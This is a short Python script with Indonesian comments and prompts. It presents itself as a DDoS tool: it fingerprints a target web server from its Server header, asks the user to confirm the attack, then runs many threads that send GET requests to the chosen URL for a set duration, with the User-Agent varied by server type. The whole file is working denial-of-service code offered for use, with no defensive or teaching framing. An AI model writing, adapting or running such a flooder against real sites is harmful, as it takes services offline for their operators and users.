import requests
import threading
import time

# Fungsi untuk mendeteksi jenis web server
def detect_web_server(url):
    try:
        response = requests.head(url)
        server_header = response.headers.get("Server", "Tidak Terdeteksi")
        print(f"Jenis Web Server yang terdeteksi: {server_header}")
        return server_header
    except Exception as e:
        print("Gagal mendeteksi server:", e)
        return None

# Fungsi untuk mengonfirmasi dari pengguna apakah akan melanjutkan serangan
def prompt_user(server_type):
    response = input(f"Web server terdeteksi sebagai {server_type}. Lanjutkan serangan DDoS? (y/n): ")
    return response.lower() == 'y'

# Fungsi untuk menjalankan serangan DDoS dengan logika khusus berdasarkan jenis server dan durasi serangan
def perform_ddos_attack(url, server_type, num_threads, attack_duration):
    end_time = time.time() + attack_duration  # Hitung waktu akhir serangan

    def send_request():
        while time.time() < end_time:
            try:
                # Sesuaikan header User-Agent berdasarkan jenis server
                if server_type.lower() == "nginx":
                    response = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (compatible; NginxBot/1.0)"})
                elif server_type.lower() == "apache":
                    response = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (compatible; ApacheBot/1.0)"})
                else:
                    response = requests.get(url)

                print(response.json())
            except Exception as e:
                print("API tidak merespon:", e)

    # Mulai serangan DDoS dengan jumlah thread yang ditentukan pengguna
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()

# Prompt untuk input URL, jumlah thread, dan durasi waktu dari pengguna
url = input("Masukkan URL target: ")
num_threads = int(input("Masukkan jumlah thread untuk serangan DDoS: "))
attack_duration = int(input("Masukkan durasi waktu serangan dalam detik: "))

# Jalankan deteksi server dan mulai proses serangan
server_type = detect_web_server(url)
if server_type:
    if prompt_user(server_type):
        print(f"Memulai serangan DDoS ke server jenis {server_type} pada {url} dengan {num_threads} thread selama {attack_duration} detik...")
        perform_ddos_attack(url, server_type, num_threads, attack_duration)
    else:
        print("Serangan dibatalkan oleh pengguna.")
else:
    print("Gagal mendeteksi jenis web server. Tidak dapat melanjutkan serangan.")
